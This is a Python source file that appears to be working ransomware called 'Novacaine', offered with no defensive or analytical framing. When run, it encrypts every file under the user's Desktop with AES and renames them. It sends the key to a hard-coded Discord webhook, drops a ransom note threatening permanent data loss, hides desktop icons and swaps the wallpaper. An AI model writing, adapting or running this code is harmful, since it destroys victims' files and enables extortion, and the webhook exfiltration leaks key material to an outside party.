import os
import base64
import requests
import ctypes
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from pathlib import Path
import json

# Function to encrypt a single file
def encrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        data = file.read()

    cipher = AES.new(key, AES.MODE_EAX)
    nonce = cipher.nonce
    ciphertext, tag = cipher.encrypt_and_digest(data)

    with open(file_path, 'wb') as file:
        file.write(nonce + tag + ciphertext)

# Function to encrypt all files in a directory
def encrypt_directory(directory_path, key):
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)
            os.rename(file_path, file_path + '.novacaine')

# Function to send the encryption key to a Discord webhook
def send_key_to_webhook(webhook_url, key):
    message = {
        "content": f"New Encryption Key: {key}"
    }
    requests.post(webhook_url, data=json.dumps(message), headers={"Content-Type": "application/json"})

# Function to create a ransom note
def create_ransom_note(desktop_path, key):
    ransom_note_content = f"""
    ###############################################
    #             Novacaine Ransomware           #
    ###############################################
    Your files have been encrypted with Novacaine.
    To decrypt your files, follow these steps:

    1. Copy the key below:
       {key}

    2. Paste the key into the decryption tool provided by your attacker.
    3. Run the decryption tool to recover your files.

    Failure to pay the ransom will result in permanent data loss.

    ###############################################
    """
    ransom_note_path = os.path.join(desktop_path, "RANSOM_NOTE.txt")
    with open(ransom_note_path, 'w') as file:
        file.write(ransom_note_content)

# Function to clear desktop icons
def clear_desktop_icons():
    key = ctypes.windll.user32.FindWindowW(None, "Progman")
    ctypes.windll.user32.SendMessageTimeoutW(key, 0x0112, 0xF020, 0, 0, 0x0002)

# Function to change desktop background
def change_desktop_background(image_path):
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path , 0)

# Generate a random encryption key
key = get_random_bytes(32)

# Specify the directory to encrypt
directory_to_encrypt = os.path.expanduser("~/Desktop")

# Encrypt the specified directory
encrypt_directory(directory_to_encrypt, key)

# Encode the key for storage or transmission
encoded_key = base64.b64encode(key).decode('utf-8')

# Send the key to a Discord webhook
webhook_url = 'https://discord.com/api/webhooks/1247093717412614154/aWlWAIS3EssPpTKrAkS-4-8Xy8bBA2LTuEA-Xp0uY1TMocAm71TwEQYRpayZjG-rBs6H'
send_key_to_webhook(webhook_url, encoded_key)

# Create a ransom note on the desktop
desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
create_ransom_note(desktop_path, encoded_key)

# Clear desktop icons
clear_desktop_icons()

# Change desktop background
image_path = os.path.join(os.path.dirname(__file__), 'ransom_background.jpg')
change_desktop_background(image_path)